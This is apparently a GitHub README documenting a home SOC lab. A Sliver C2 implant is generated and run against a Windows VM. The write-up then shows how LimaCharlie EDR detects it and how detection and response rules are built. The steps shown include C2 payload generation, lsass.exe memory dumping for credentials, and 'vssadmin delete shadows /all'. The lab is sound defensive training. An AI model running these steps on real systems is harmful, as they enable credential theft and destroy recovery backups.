# SOC Analyst Project with LimaCharlie: Command and Control with Sliver on Ubuntu and Windows

## Windows VM Setup

Preventing the computer from going into sleep/standby mode.
```bash
powercfg /change standby-timeout-ac 0
powercfg /change standby-timeout-dc 0
powercfg /change monitor-timeout-ac 0
powercfg /change monitor-timeout-dc 0
powercfg /change hibernate-timeout-ac 0
powercfg /change hibernate-timeout-dc 0
```

# LimaCharlie Setup
## Sensors

    Primary input for data into LimaCharlie.
    Run on various platforms and send JSON events to LC's cloud.

## Organizations

    Projects and configurations stored in a chosen region.

## Outputs

    Forwarding data to storage solutions like SFTP server or Amazon S3.

## Add-Ons

    Enabling additional features within an organization.

# Creating an Organization within LimaCharlie
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/1121ea3f-d85b-49c7-a6dc-a831f915585b)
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/d045965b-cd90-427b-b012-13078dcdc116)


## Installing First Sensor
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/041a764f-7226-4a4d-8b10-9a358745f63c)
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/a364897c-c223-41dd-b972-31a05c0d589d)
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/2287a3ef-440c-4753-9afe-805b62cb63a1)
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/fecb10bd-dd3c-458b-8be4-d24696a5b1cf)

![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/5a9127bb-56bf-45e0-b64a-2cfbd2f5ac33)
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/a9581edc-d914-4c09-9995-a850c09dfc1d)

## Configuring LimaCharlie

    Shipping Sysmon event logs alongside EDR telemetry. 
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/7847449c-e302-4408-8de0-cf86de8479c8)
- Some information will be redundant to LimaCharlie's own telemetry but Sysmon is a very powerful visibility tool that runs well alongside and EDR agent. 

## Using SSH Client to Access Ubuntu VM

    Accessing via built-in command prompt on host machine.
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/8659db27-23a6-4ef7-9986-87f219b8e841)
- sudo su
- cd/opt/sliver
- sliver-server


## Sliver C2 Payload Generation

    Generating C2 session payload in Sliver shell.
    generate --http [IP ADDRESS]--save /opt/sliver
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/ab788a58-f973-448c-906c-fcb63deff200)
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/737c53cb-46ae-4d59-90b6-9cecb2315976)


## Downloading C2 Payload to Windows VM

    Using Python to create a temporary web server.
    python 3 -m http.server 80

## Initiating HTTP Listener in Sliver
    sliver-server
    http
 ![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/80fe7f98-ae95-4673-a200-042a95cc4a13)
 ![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/503d47f3-cfda-4113-a311-df2168d76fdf)
 ![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/5ffcc47b-dc58-4f4a-98bb-d15c37e729cd)
 ![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/9a33ce99-477c-4b7a-89c4-9c684d4757dd)
 ![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/e75923b6-a520-4cac-ab6b-427064874ced)

## Command Execution and Privilege Escalation

    Executing commands like info, whoami, getprivs, and pwd.
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/0d631658-c3e7-4d1b-8be6-4d0bbf9728aa)
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/105352c7-8862-4bad-a598-9d3051ca72d7)
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/c24f66c8-07f7-42db-9427-342fd722321d)

- We have a few privileges that make further attack activity much easier!
- Now to identify our implant's working directory with the use of pwd
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/1925fc34-34f6-4d45-acaa-4c74d3512353)

netstat 
- Examine network connections occurring on the remote system
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/8e97804d-c7fe-4817-81de-2ad5f2d927d5)
- Sliver highlights its own process in green
- All defensive tools are in red
- rphcp.exe is the LimaCharlie EDR service executable

Identify running processes on the remote system
- ps -T
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/f2fb3443-0add-4695-815a-08fcd47095ec)
  
## Observing EDR Telemetry in LimaCharlie

    Identifying malicious processes and activities.
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/d1435189-ab6b-458a-9d96-8f520c667d6a)
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/dda2bb51-c801-4669-9af3-c42b66b2cf65)

To spot an evil process, you must look for ones that are not signed. 
- While some signed can be malicious, they often are not.
- 
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/ab0c6ba6-3888-4896-bf04-48616e537b2b)
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/0ad96894-cdb7-464a-984c-138d9c394acb)
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/79c9641c-12e5-493a-bce8-de1e655a0835)
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/fcac5616-5f08-49ae-9d30-de5e22d056f0)

- I can see the LimaCharlie rphcp.exe
- I can see a lot of the open Python3 web servers
- Then I see the C2 Payload, which I accidently executed twice.

Navigated to the location where the payload was known to have been downloaded

![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/684e47d5-47a2-40fa-b83f-8e949055407b)

Checking the hash with VirusTotal
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/1661d47f-3bde-49b1-931c-9049e1b5a4b8)
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/bae34e64-35c0-456e-b34b-c103208fffea)

- It not being found doesn't make it innocent. We just generated this payload ourselves so it hasn't been found or known to VT yet.
- Nearly everything has already been seen by VT, so this would be a suspicious finding!
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/1c7cb322-6660-46ba-85e4-b95afe55af8b)
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/ea2a08a7-9b11-4613-bc61-456c3069d254)
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/de5678f9-1a11-4305-9f7f-25385241c68d)
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/373dc148-996a-478b-be70-c5f19dac1eb5)

## Response to Credential Dumping

    Detecting and responding to sensitive process access.
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/bcf9b095-4c56-4978-8654-f097d567b133)

Had to relaunch the payload in administrative powershell mode (even though I already did) and was able to get the Enabled SeDebugPriviledge
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/402332f1-92a0-463c-ab1f-a1017c0c019f)

Now I am going to drop the lsass.exe from memory and save it locally on the Sliver C2 server.
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/197b6792-6449-4016-afd4-78b3c9ba6e34)


## Building Detection and Response Rules

    Crafting rules for events like sensitive process access and shadow copies deletion.
- lsass.exe is known sensitive process targeted by credential dumping tools so we should find them in the EDR.
- Drilling into the Timeline of the Windows VM sensor:
- I am going to use the Event Type Filters to filter for sensitive_process_access
  
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/4c2d23a3-4b43-430b-b8c6-a3290cc7ccfb)
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/34f37be8-52b5-4e78-894e-740eafbfd7f1)

Telling it to look at SENSITIVE_PROCESS_ACCESS events where the victim or target process ends with lsass.exe
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/9366d54b-3169-4e02-bb0f-4bdeacca7baa)
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/6b044a3d-6961-4e75-bbac-29d2c48603da)

LimaCharlie allows for testing of the logic, which we will do in this Target Event section. 
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/47c85b29-9b64-4341-aa7e-69b459e9b0af)
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/64c9c510-136f-40a8-a282-371aa74fef4c)
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/7e4c1fe0-f47e-475a-b1d7-f5c399b91e9f)
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/d14e3fa9-d9f6-460c-8b06-65355cfabeea)

## Blocking Attacks!
Must always properly baseline the environment for false positives else you could cause issues with your environment. 


Volume Shadow Copies provide a convenient way to restore individual files or even an entire file system. It is often used for recovering from ransomware attacks. For this reason, it’s become very predictable that one of the first signs of an impending ransomware attack is the deletion of volume shadow copies. 

Getting back to the SSH session, we will launch a shell via Sliver with "shell"
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/33e43c23-f311-4013-873d-ada8a9ad2134)

We will run the command vssadmin delete shadows /all
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/f9b00c6f-fb29-4270-bf44-512c2375b09b)
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/64285f75-1e10-41c8-b2e6-0ac630b7ea0a)

LimaCharlie picked up on the Shadow Copies Deletion Using OS utilities.
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/06b3f228-b75f-4dfb-a577-6cd9554d7c1c)

It even provides references!
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/6413d9d4-2725-40ef-97e7-ad6cc1cd7fde)

Let's craft a D&R response to the already formatted rule for this event! 
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/96e586e1-ac43-42bc-a969-1e1b4fbbffc4)

Time to try it in the wild. 
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/97f3d9c7-1405-4995-9ea2-2c28b7d5edad)

whoami
![image](https://github.com/CertainRisk/LimaCharlie-Sliver-C2-Project/assets/141761181/68f5e565-89dd-4150-88e7-87164045cecf)

If our rule worked, the system shell will hang and fail to return anything and shut down, which it did!

## Handling False Positives

    Crafting rules to limit false detections.

## Advanced EDR Capabilities

    Adding YARA signatures for malware detection.
